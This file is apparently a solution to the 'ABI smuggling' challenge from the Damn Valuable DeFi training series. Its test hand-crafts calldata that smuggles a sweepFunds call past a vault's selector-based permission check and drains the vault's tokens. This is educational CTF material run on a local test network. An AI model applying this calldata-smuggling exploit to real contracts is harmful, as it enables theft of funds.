const { ethers } = require('hardhat');
const { expect } = require('chai');
const { time } = require("@nomicfoundation/hardhat-network-helpers");

describe('[Challenge] ABI smuggling', function () {
    let deployer, player, recovery;
    let token, vault;
    
    const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, player, recovery ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy Vault
        vault = await (await ethers.getContractFactory('SelfAuthorizedVault', deployer)).deploy();
        expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

        // Set permissions
        const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);
        const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address);
        await vault.setPermissions([deployerPermission, playerPermission]);
        expect(await vault.permissions(deployerPermission)).to.be.true;
        expect(await vault.permissions(playerPermission)).to.be.true;

        // Make sure Vault is initialized
        expect(await vault.initialized()).to.be.true;

        // Deposit tokens into the vault
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

        expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(0);

        // Cannot call Vault directly
        await expect(
            vault.sweepFunds(deployer.address, token.address)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
        await expect(
            vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        // Try to fast forward 15 days and just call the withdraw function
        // Print out the calldata to understand how it works
        const fastForward = await time.increase(15 * 24 * 60 * 60); // 15 days in seconds
        let calldata = await vault.interface.encodeFunctionData(
            'withdraw', [
                token.address,
                player.address,
                1n ** 18n
            ]
        )
        console.log("--------------Calldata -----------------");
        console.log("Calldata[function selector]" , calldata.slice(0, 34))
        console.log("Calldata[token address]", calldata.slice(34, 98))
        console.log("Calldata[player address]", calldata.slice(98, 162))
        console.log("Calldata[amount]", calldata.slice(162, calldata.length))
        // console.log("Calldata", calldata)


        // const withdraw = await vault.connect(player).execute(vault.address, calldata)
        // calldata = withdraw.data
        // console.log("------------Transaction Calldata------------");
        // console.log("Calldata[function selector]" , calldata.slice(0, 34))
        // console.log("Calldata[target address]", calldata.slice(34, 98))
        // console.log("Calldata[actionData offset]", calldata.slice(98, 137))
        // console.log("Calldata[actionData size]", calldata.slice(137, 202))
        // console.log("Calldata[actionData]", calldata.slice(202, calldata.length))
        // console.log("Calldata", calldata)

        // construct calldata to exploit the contract
        const executeFunction = await vault.interface.getFunction("execute");
        const executeSig = await vault.interface.getSighash(executeFunction); 

        const vaultAddress = await ethers.utils.hexZeroPad(vault.address, 32);

        const withdrawFunction = await vault.interface.getFunction("withdraw")
        const withdrawSig = await vault.interface.getSighash(withdrawFunction);

        const nops = await ethers.utils.hexZeroPad("0x0", 32);

        const exploitOffset = await ethers.utils.hexZeroPad("0x64", 32);
        const exploitSize = await ethers.utils.hexZeroPad("0x44", 32);

        const exploitCalldata = await vault.interface.encodeFunctionData(
            "sweepFunds", [
                recovery.address, 
                token.address
            ]
        )
        const padding = await ethers.utils.hexZeroPad("0x0", 24);

        const actionData = await ethers.utils.hexConcat(
            [exploitOffset, 
            nops, 
            withdrawSig,
            exploitSize, 
            exploitCalldata,
            padding]
        )
        const functionCallData = await ethers.utils.hexConcat([executeSig, vaultAddress, actionData])
        const txn = await player.sendTransaction({to: vault.address, data: functionCallData})

        console.log(functionCallData)


    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(0);
        expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
